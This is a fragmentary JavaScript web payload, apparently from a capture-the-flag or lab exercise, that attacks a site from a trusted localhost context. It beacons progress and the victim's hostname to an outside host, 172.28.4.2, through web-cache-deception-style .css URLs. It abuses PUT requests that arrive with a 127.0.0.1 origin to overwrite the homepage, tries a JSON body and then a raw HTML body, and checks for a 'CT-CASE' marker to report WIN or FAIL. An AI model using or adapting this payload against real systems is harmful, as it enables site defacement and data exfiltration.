(async () => {
  ...
  // Beacon via /archive/ WCD — URL-keyed, cross-session visible
  const bc = async (k) => {
    const key = k.substring(0, 35).replace(/[^a-zA-Z0-9_]/g, '_');
    try {
      await fetch('http://172.28.4.2/archive/' + T + '_' + key + '.css', {
  ...
  const cleanHost = host.replace(/\./g, '_').substring(0, 15);
  await bc('H_' + cleanHost);
  ...
  // Phase 2: running from 127.0.0.1 context — PUT has REMOTE_ADDR=127.0.0.1
  await bc('P2');
...
<body>
  ...
  try {
    ...
    jsonOk = t.includes('CT-CASE');
    await bc('PUT_JSON_' + r.status + (jsonOk ? '_CT' : '_NO'));
  } catch(e) {
    await bc('PUT_JSON_ERR');
  }

  // Try raw HTML body PUT as fallback
  let rawOk = false;
  if (!jsonOk) {
    try {
      ...
      rawOk = t2.includes('CT-CASE');
      await bc('PUT_RAW_' + r2.status + (rawOk ? '_CT' : '_NO'));
    } catch(e) {
      await bc('PUT_RAW_ERR');
    }
  }

  // Verify homepage
  try {
    const hr = await fetch('/?_nc=' + Date.now(), {cache: 'no-store'});
    const ht = await hr.text();
    await bc(ht.includes('CT-CASE') ? 'WIN' : 'FAIL');
  } catch(e) {
    await bc('CHK_ERR');
  }
})();
